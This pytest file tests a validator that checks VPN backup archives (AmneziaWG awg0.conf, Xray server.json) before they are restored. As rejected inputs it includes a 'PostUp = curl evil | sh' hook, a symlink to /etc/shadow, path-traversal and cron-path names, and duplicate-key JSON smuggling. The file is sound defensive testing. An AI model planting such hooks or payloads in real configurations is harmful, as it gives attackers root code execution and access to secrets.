"""Restore validation: a backup must not be able to run code on the entry.

awg-quick executes PreUp/PostUp/... from awg0.conf as root, age gives no
authenticity and the recipient is public, so a holder of the S3 writer key
could plant such a backup. Only plain files at the archive root and an
allow-listed awg0.conf are accepted.
"""
import io
import sys
import tarfile

import pytest

from test_render import ROOT

sys.path.insert(0, str(ROOT / "plugins" / "filter"))
import backup  # noqa: E402

PORT = 51820
SUBNET = "10.8.1.0/24"
CONF = """[Interface]
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MDA=
Address = 10.8.1.1/24
ListenPort = 51820
Jc = 5
Jmin = 10
Jmax = 50
S1 = 12
S2 = 12
S3 = 12
S4 = 12
H1 = 1
H2 = 2
H3 = 3
H4 = 4
HeaderProtectionKey = aGVhZGVy
RekeyAfterTime = 100-120
RandomTrailers = on
# I1 = <r 2><b 0x8580>
# I2 =

[Peer]
PublicKey = cGVlcnB1YmxpY2tleXBlZXJwdWJsaWNrZXlwZWVyMDA=
PresharedKey = cHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrcHNrMDA=
AllowedIPs = 10.8.1.2/32
"""


def _tar(path, members=None, conf=CONF, extra=()):
    """members: list of (name, kind, data); default: a valid backup."""
    if members is None:
        members = [(".", "dir", None), ("./awg0.conf", "file", conf),
                   ("./wireguard_server_private_key.key", "file", "K\n"),
                   ("./clientsTable", "file", "[]\n")]
    members = list(members) + list(extra)
    with tarfile.open(path, "w") as tar:
        for name, kind, data in members:
            info = tarfile.TarInfo(name)
            raw = data.encode() if isinstance(data, str) else (data or b"")
            if kind == "file":
                info.size = len(raw)
                tar.addfile(info, io.BytesIO(raw))
                continue
            info.type = {"dir": tarfile.DIRTYPE, "symlink": tarfile.SYMTYPE,
                         "hardlink": tarfile.LNKTYPE, "chr": tarfile.CHRTYPE,
                         "fifo": tarfile.FIFOTYPE}[kind]
            if kind in ("symlink", "hardlink"):
                info.linkname = data
            tar.addfile(info)
    return str(path)


def _problems(tmp_path, **kw):
    return backup.backup_archive_problems(_tar(tmp_path / "b.tar", **kw), PORT, SUBNET)


def test_valid_backup_passes(tmp_path):
    assert _problems(tmp_path) == []


def test_app_style_network_address_passes(tmp_path):
    # The Amnezia app writes the network address itself (10.8.1.0/24).
    assert _problems(tmp_path, conf=CONF.replace("10.8.1.1/24", "10.8.1.0/24")) == []


@pytest.mark.parametrize("kind,data", [("symlink", "/etc/shadow"), ("hardlink", "./awg0.conf"),
                                       ("chr", None), ("fifo", None)])
def test_non_regular_members_are_refused(tmp_path, kind, data):
    probs = _problems(tmp_path, extra=[("./evil", kind, data)])
    assert any("./evil" in p and "regular file" in p for p in probs), probs


@pytest.mark.parametrize("name", ["./sub/awg0.conf", "sub", "../x", "/etc/cron.d/x", "./"])
def test_members_outside_the_archive_root_are_refused(tmp_path, name):
    kind = "dir" if name in ("sub", "./") else "file"
    probs = _problems(tmp_path, extra=[(name, kind, "x")])
    assert probs and any(name.strip("/") in p or "duplicate" in p or "root" in p for p in probs), probs


def test_duplicate_members_are_refused(tmp_path):
    probs = _problems(tmp_path, extra=[("./awg0.conf", "file", CONF + "PostUp = id\n")])
    assert any("duplicate" in p for p in probs), probs


@pytest.mark.parametrize("line", [
    "PostUp = curl evil | sh", "PreUp = id", "PostDown = id", "PreDown = id",
    "SaveConfig = true", "Table = off", "DNS = 1.1.1.1", "FwMark = 0x1", "Bogus = 1"])
def test_interface_keys_outside_the_allow_list_are_refused(tmp_path, line):
    conf = CONF.replace("ListenPort = 51820\n", f"ListenPort = 51820\n{line}\n")
    probs = _problems(tmp_path, conf=conf)
    key = line.split("=")[0].strip()
    assert any(f"'{key}'" in p for p in probs), probs


def test_lower_case_and_trailing_comment_do_not_bypass(tmp_path):
    conf = CONF.replace("ListenPort = 51820\n", "ListenPort = 51820\n  postup=id # comment\n")
    assert any("'postup'" in p for p in _problems(tmp_path, conf=conf))


def test_peer_keys_outside_the_allow_list_are_refused(tmp_path):
    probs = _problems(tmp_path, conf=CONF + "PostUp = id\n")
    assert any("'PostUp'" in p and "[Peer]" in p for p in probs), probs


@pytest.mark.parametrize("conf,needle", [
    ("Address = 10.8.1.1/24\n" + CONF, "outside a section"),
    (CONF.replace("[Peer]", "[peer]"), "section"),
    (CONF.replace("Jc = 5\n", "Jc 5\n"), "not a 'Key = value' line"),
    (CONF.replace("ListenPort = 51820", "ListenPort = 40000"), "ListenPort 40000"),
    (CONF.replace("ListenPort = 51820\n", ""), "ListenPort"),
    (CONF.replace("10.8.1.1/24", "10.9.9.1/24"), "Address 10.9.9.1/24"),
    (CONF.replace("Address = 10.8.1.1/24\n", ""), "Address"),
])
def test_structure_port_and_subnet(tmp_path, conf, needle):
    probs = _problems(tmp_path, conf=conf)
    assert any(needle in p for p in probs), probs


def test_required_files_and_text(tmp_path):
    probs = _problems(tmp_path, members=[(".", "dir", None), ("./awg0.conf", "file", b"\xff\xfe")])
    assert any("wireguard_server_private_key.key" in p for p in probs), probs
    assert any("UTF-8" in p for p in probs), probs


# --- the entry Xray state under ./xray/ ---------------------------------------

import json  # noqa: E402

XRAY_PORT = 443
SERVER_JSON = (ROOT / "tests" / "fixtures" / "amnezia-xray-server.json").read_text()
XRAY_KEYS = {
    "xray_uuid.key": "22222222-2222-4222-8222-222222222222\n",
    "xray_private.key": "eHJheXByaXZhdGVrZXl4cmF5cHJpdmF0ZWtleXhyYXk\n",
    "xray_public.key": "eHJheXB1YmxpY2tleXhyYXlwdWJsaWNrZXl4cmF5cHU\n",
    "xray_short_id.key": "fedcba9876543210\n",
}


def _xray(server=SERVER_JSON, keys=None, extra=()):
    keys = XRAY_KEYS if keys is None else keys
    return [("./xray", "dir", None), ("./xray/server.json", "file", server),
            *[(f"./xray/{k}", "file", v) for k, v in keys.items()], *extra]


def _xray_problems(tmp_path, xray_port=XRAY_PORT, **kw):
    return backup.backup_archive_problems(_tar(tmp_path / "b.tar", **kw), PORT, SUBNET,
                                          xray_port)


def _server(mutate):
    cfg = json.loads(SERVER_JSON)
    mutate(cfg)
    return json.dumps(cfg)


def test_xray_dir_accepted(tmp_path):
    clients = _xray(extra=[("./xray/clientsTable", "file", '[{"clientId": "x"}]\n')])
    assert _xray_problems(tmp_path, extra=clients) == []


def test_xray_unknown_file_rejected(tmp_path):
    probs = _xray_problems(tmp_path, extra=_xray(extra=[("./xray/evil.sh", "file", "id\n")]))
    assert any("xray/evil.sh" in p for p in probs), probs


def test_xray_nested_dir_rejected(tmp_path):
    probs = _xray_problems(tmp_path, extra=_xray(extra=[("./xray/a", "dir", None),
                                                        ("./xray/a/b", "file", "x")]))
    assert any("xray/a/b" in p for p in probs), probs
    assert any("'./xray/a'" in p for p in probs), probs


@pytest.mark.parametrize("kind,data", [("symlink", "/etc/shadow"), ("hardlink", "./awg0.conf"),
                                       ("chr", None), ("fifo", None)])
def test_xray_non_regular_members_rejected(tmp_path, kind, data):
    keys = {k: v for k, v in XRAY_KEYS.items() if k != "xray_private.key"}
    probs = _xray_problems(tmp_path, extra=_xray(keys=keys, extra=[
        ("./xray/xray_private.key", kind, data)]))
    assert any("xray/xray_private.key" in p and "regular file" in p for p in probs), probs


@pytest.mark.parametrize("name", ["./xray/../etc/x", "/xray/server.json", "xray/./server.json"])
def test_xray_odd_paths_rejected(tmp_path, name):
    probs = _xray_problems(tmp_path, extra=_xray(extra=[(name, "file", "x")]))
    assert any(name in p for p in probs), probs


def test_xray_root_name_must_be_the_directory(tmp_path):
    probs = _xray_problems(tmp_path, extra=[("./xray", "file", "x")])
    assert any("'./xray'" in p and "directory" in p for p in probs), probs


def test_xray_required_files(tmp_path):
    probs = _xray_problems(tmp_path, extra=_xray(keys={}))
    for name in XRAY_KEYS:
        assert any(f"xray/{name} is missing" in p for p in probs), probs
    probs = _xray_problems(tmp_path, extra=[("./xray", "dir", None)])
    assert any("xray/server.json is missing" in p for p in probs), probs


@pytest.mark.parametrize("mutate,needle", [
    (lambda c: c.update(routing={"rules": []}), "'routing'"),
    (lambda c: c.update(api={"tag": "api"}), "'api'"),
    (lambda c: c.update(stats={}), "'stats'"),
    (lambda c: c.update(policy={}), "'policy'"),
    (lambda c: c["inbounds"].append({**c["inbounds"][0], "port": 10085}), "exactly one inbound"),
    (lambda c: c["outbounds"].__setitem__(0, {"protocol": "blackhole"}), "outbounds"),
    (lambda c: c["outbounds"].append({"protocol": "freedom", "tag": "x"}), "outbounds"),
    (lambda c: c["outbounds"][0].update(settings={"redirect": "127.0.0.1:22"}), "outbounds"),
    (lambda c: c.update(log={"loglevel": "error", "access": "/opt/amnezia/start.sh"}), "log"),
    (lambda c: c["inbounds"][0].update(protocol="dokodemo-door"), "vless"),
    (lambda c: c["inbounds"][0].update(listen="0.0.0.0"), "'listen'"),
    (lambda c: c["inbounds"][0]["settings"].update(decryption="mlkem"), "decryption"),
    (lambda c: c["inbounds"][0]["settings"].update(fallbacks=[{"dest": 22}]), "'fallbacks'"),
    (lambda c: c["inbounds"][0]["settings"]["clients"].append({"id": "x", "flow": "", "email": "e"}),
     "clients"),
    (lambda c: c["inbounds"][0]["settings"].update(clients={}), "clients"),
    (lambda c: c["inbounds"][0]["streamSettings"].update(security="tls"), "reality"),
    (lambda c: c["inbounds"][0]["streamSettings"].update(network="ws"), "network"),
    (lambda c: c["inbounds"][0]["streamSettings"].update(sockopt={"mark": 1}), "'sockopt'"),
    (lambda c: c["inbounds"][0]["streamSettings"].pop("realitySettings"), "realitySettings"),
    (lambda c: c["inbounds"][0]["streamSettings"]["realitySettings"].update(dest="/run/x.sock"),
     "dest"),
    (lambda c: c["inbounds"][0]["streamSettings"]["realitySettings"].update(xver=2), "'xver'"),
    (lambda c: c.pop("outbounds"), "outbounds"),
])
def test_xray_server_json_extra_sections_rejected(tmp_path, mutate, needle):
    probs = _xray_problems(tmp_path, extra=_xray(server=_server(mutate)))
    assert any(needle in p and "server.json" in p for p in probs), probs


@pytest.mark.parametrize("server", ["not json", "[]", '{"log": {}}', b"\xff\xfe"])
def test_xray_server_json_garbage_rejected(tmp_path, server):
    probs = _xray_problems(tmp_path, extra=_xray(server=server))
    assert any("server.json" in p for p in probs), probs


def test_xray_server_json_wrong_port_rejected(tmp_path):
    server = _server(lambda c: c["inbounds"][0].update(port=8443))
    probs = _xray_problems(tmp_path, extra=_xray(server=server))
    assert any("8443" in p and "entry_xray_port 443" in p for p in probs), probs
    assert backup.xray_server_json_problems(server, 8443) == []
    assert backup.xray_server_json_problems(SERVER_JSON, 443) == []


def test_xray_port_not_compared_without_xray_port(tmp_path):
    # Xray disabled: the xray/ dir is not restored, only its structure is checked.
    server = _server(lambda c: c["inbounds"][0].update(port=8443))
    assert _xray_problems(tmp_path, xray_port=None, extra=_xray(server=server)) == []
    probs = _xray_problems(tmp_path, xray_port=None, extra=_xray(extra=[("./xray/x", "file", "")]))
    assert any("xray/x" in p for p in probs), probs


@pytest.mark.parametrize("name,value", [
    ("xray_uuid.key", "not-a-uuid\n"),
    ("xray_uuid.key", "22222222-2222-4222-8222-222222222222\nsecond line\n"),
    ("xray_private.key", "short\n"),
    ("xray_private.key", "eHJheXByaXZhdGVrZXl4cmF5cHJpdmF0ZWtleXhyYXk=\n"),
    ("xray_public.key", "eHJheXB1YmxpY2tleXhyYXlwdWJsaWNrZXl4cmF5c+/\n"),
    ("xray_short_id.key", "fedcba987654321\n"),
    ("xray_short_id.key", "fedcba9876543210\r\n"),
    ("xray_short_id.key", ""),
])
def test_xray_key_files_must_be_single_line_values(tmp_path, name, value):
    probs = _xray_problems(tmp_path, extra=_xray(keys={**XRAY_KEYS, name: value}))
    assert any(f"xray/{name}" in p for p in probs), probs


def test_xray_clients_table_must_be_json(tmp_path):
    probs = _xray_problems(tmp_path, extra=_xray(extra=[("./xray/clientsTable", "file", "{oops")]))
    assert any("xray/clientsTable" in p and "JSON" in p for p in probs), probs


def test_old_backup_without_xray_still_valid(tmp_path):
    # Archives made before Task 9 have only the AWG files at the root.
    assert _xray_problems(tmp_path) == []
    assert backup.backup_archive_problems(_tar(tmp_path / "old.tar"), PORT, SUBNET) == []


# --- fix round 1 ---------------------------------------------------------------

def _dup(server, anchor, dup):
    """Insert `dup` (a raw `"key": value` fragment) right after the `anchor` text."""
    assert anchor in server
    return server.replace(anchor, anchor + dup, 1)


@pytest.mark.parametrize("server", [
    # Go's encoding/json merges a duplicate object into the already-filled field:
    # json.loads would keep only the last one and miss the access log.
    _dup(SERVER_JSON, "{\n", '"log": {"loglevel": "info", "access": "/etc/cron.d/x"},\n'),
    _dup(SERVER_JSON, '"port": 443,\n',
         '"streamSettings": {"security": "reality", "sockopt": {"mark": 1}, "realitySettings": {}},\n'),
    _dup(SERVER_JSON, '"streamSettings": {\n', '"realitySettings": {"dest": "/run/x.sock"},\n'),
    _dup(SERVER_JSON, '"flow": "xtls-rprx-vision",\n', '"flow": "none",\n'),
])
def test_xray_server_json_duplicate_keys_rejected(tmp_path, server):
    json.loads(server)  # still valid for a last-key-wins parser
    probs = _xray_problems(tmp_path, extra=_xray(server=server))
    assert any("server.json" in p and "duplicate key" in p for p in probs), probs


def test_xray_clients_table_duplicate_keys_rejected(tmp_path):
    table = '[{"clientId": "a", "clientId": "b"}]\n'
    probs = _xray_problems(tmp_path, extra=_xray(extra=[("./xray/clientsTable", "file", table)]))
    assert any("xray/clientsTable" in p and "duplicate key" in p for p in probs), probs


@pytest.mark.parametrize("dest", [
    "localhost:443", "LOCALHOST:443", "127.0.0.1:443", "127.1.2.3:443", "10.0.0.1:443",
    "172.16.0.1:443", "172.31.255.255:443", "192.168.1.1:443", "169.254.169.254:443",
    "100.64.0.1:443", "0.0.0.0:443", "[::1]:443", "::1:443", "8.8.8.8:443",
])
def test_xray_reality_dest_must_be_a_public_host_name(tmp_path, dest):
    server = _server(lambda c: c["inbounds"][0]["streamSettings"]["realitySettings"].update(dest=dest))
    probs = _xray_problems(tmp_path, extra=_xray(server=server))
    assert any("dest" in p for p in probs), probs


@pytest.mark.parametrize("dest", ["www.googletagmanager.com:443", "dl.google.com:443",
                                  "a-b.example.co.uk:443"])
def test_xray_reality_dest_host_names_pass(tmp_path, dest):
    server = _server(lambda c: c["inbounds"][0]["streamSettings"]["realitySettings"].update(dest=dest))
    assert _xray_problems(tmp_path, extra=_xray(server=server)) == []
